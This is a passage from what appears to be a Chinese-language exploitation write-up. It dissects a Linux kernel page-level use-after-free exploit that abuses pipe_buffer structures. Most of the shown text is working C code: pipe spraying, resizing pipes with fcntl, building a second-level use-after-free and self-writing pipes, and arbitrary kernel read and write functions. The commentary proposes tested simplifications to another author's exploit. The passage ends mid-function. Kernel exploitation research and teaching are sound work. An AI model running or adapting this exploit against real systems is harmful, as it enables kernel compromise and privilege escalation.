class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有人可能会好奇,为什么找到了victim后就直接break了,这样不是会有可能略过orig的读取,从而导致之后的读写不一致吗</p><p>这个因为其之后的操作都是基于victim的,所以不必担心</p><hr><p>不过还有一个疑问,就是一种极端情况</p><p>如果i=0时,就找到了victim,那么之后所有的pipe就都没进行读取,这样在第二次uaf的判断中,读取时不就会出现错误嘛</p><p>所以我个人认为可以就算找到了victim也不break,而是继续向下执行直到遍历完所有的pipe</p><p>当然其实必要性也不大,毕竟这个概率太小了,但我试了一下去除break其实确实是可行的</p><h3 id="第二次uaf"><a href="#第二次uaf" class="headerlink" title="第二次uaf"></a>第二次uaf</h3><p>现在我们已经有了一个可以uaf的页,并且可以读写上面的所有内容</p><p>我们首先释放这个uaf页,使其回到伙伴系统</p><p>之后再次利用fcntl修改剩余<code>pipe_buffer</code>的大小,使其重新分配,且刚好取出这个页作为slab</p><p>需要注意的是,因为之后还需要一次更改<code>pipe_buffer</code>大小,所以这次更改的大小要稍微讲究一些,即其所在slab是向order1申请内存,且objsize应该大于80,并刚好被2的幂次个pipe_buffer结构体选中作为obj</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kmalloc-cg-192       504    504    192   21    1 : tunables    0    0    0 : slabdata     24   0</span><br><span class="line">kmalloc-cg-96        252    252     96   42    1 : tunables    0    0    0 : slabdata      6   0</span><br></pre></td></tr></table></figure><p>我们选中这两个作为目标</p><p>所以此次我们需要修改的大小是<code>0x2000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><hr><p>在进一步解析之前先提一下<code>pipe_buffer</code>结构体中<code>offset</code>与<code>len</code>两个字段的作用</p><p><code>offset</code>指向未读取的数据偏移</p><p><code>len</code>代表未读取得数据得长度</p><p>也就是说</p><ul><li>对一个pipe进行read操作是从offset开始的,最多读取len长度</li><li>对一个pipe进行write操作是从offset+len处开始写起的</li></ul><p>因此我们可以看到exp中有很多用于平衡读写的操作</p><hr><p>继续exp的分析,在平衡好读写后,我们便可以读取到一个pipe_buffer的完整结构</p><p>然后我们再将其写到下一个pipe_buffer,这样我们又构造了一个uaf</p><p>之后用同样的办法找到目标管道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">       <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">       info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">    || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">        snd_orig_pid = nr;</span><br><span class="line">        snd_vicitm_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">               snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这一句</p><p><code>info_pipe_buf.page = (struct page*) ((size_t) info_pipe_buf.page + 0x40);</code></p><p><code>arttnba3</code>大佬将page指针+0x40之后才将其写到下一个pipe_buffer</p><p>而我认为这是没有必要的,甚至加了这一句之后其实反而不太好理解了,甚至如果不是random_list的作用,还可能下一个pipe_buffer的page本身就是读出的page指针+0x40</p><p>所以这一句代码是完全可以去除的,而我在去除后编译出的exp同样利用成功了,证实了我的猜测</p><h3 id="构建自写管道"><a href="#构建自写管道" class="headerlink" title="构建自写管道"></a>构建自写管道</h3><p>现在我们拥有了对应第二个uaf页的<code>struct page</code>指针</p><p>并且还能任意写第二个uaf页上的pipe_buffer结构体</p><p>那么不是可以控制其上的pipe_buffer指向自身所在页,进而控制pipe_buffer本身</p><p>这里我们需要控制三个pipe_buffer</p><p>从低到高我们分别称作A,B,C,</p><p>其中</p><ul><li>A用于任意读写</li><li>C负责控制A任意读写的范围,并在写完A后,向后移继续写B,使得B指向C</li><li>B负责将C重新指向A</li></ul><p>获取这三个pipe_buffer的方法和前面两步差不多,就不多说了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>之前已经介绍了ABC的作用,以下就是初始化准备过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的任意读写封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span 